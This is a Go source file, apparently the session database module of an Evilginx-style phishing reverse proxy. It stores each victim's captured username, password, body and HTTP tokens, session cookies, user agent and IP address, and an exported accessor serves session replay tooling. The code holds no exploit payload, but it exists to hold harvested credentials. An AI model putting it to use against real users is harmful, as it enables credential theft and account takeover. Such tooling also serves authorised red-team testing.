package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
	Cmsgid       string                             `json:"cmsgid"`
	Tmsgid       string                             `json:"tmsgid"`
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
	Secure   bool
}

func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}

// sessionsLookup performs a raw (non-mutating) existence check for sid. Used by
// sessionsCreate to detect duplicates and by sessionsGetBySid as the read half of
// an upsert. It never creates records.
func (d *Database) sessionsLookup(sid string) (*Session, bool) {
	s := &Session{}
	found := false
	_ = d.db.View(func(tx *buntdb.Tx) error {
		return tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			_ = json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
	})
	return s, found
}

func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	// Idempotent: if a session with this sid already exists (visitor revisited
	// the landing URL, or a prior CreateSession partially persisted), reuse it
	// instead of erroring. Returning an error here made the proxy proceed with a
	// session that had no DB record, which later produced "session not found" on
	// every token save and silently dropped cookies.
	if s, found := d.sessionsLookup(sid); found {
		return s, nil
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
		Cmsgid:       "",
		Tmsgid:       "",
	}

	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateCmsgid(sid string, cmsgid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Cmsgid = cmsgid
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateTmsgid(sid string, tmsgid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Tmsgid = tmsgid
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

// sessionsDeleteAll removes every session record (and its id counter) in one pass.
func (d *Database) sessionsDeleteAll() error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		var keys []string
		tx.Ascend(SessionTable+"_id", func(key, val string) bool {
			keys = append(keys, key)
			return true
		})
		for _, k := range keys {
			if _, err := tx.Delete(k); err != nil {
				return err
			}
		}
		if _, err := tx.Delete(SessionTable + ":0:id"); err != nil && err != buntdb.ErrNotFound {
			return err
		}
		return nil
	})
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

// GetSessionBySid is the exported accessor for session replay/open tooling.
func (d *Database) GetSessionBySid(sid string) (*Session, error) {
	return d.sessionsGetBySid(sid)
}
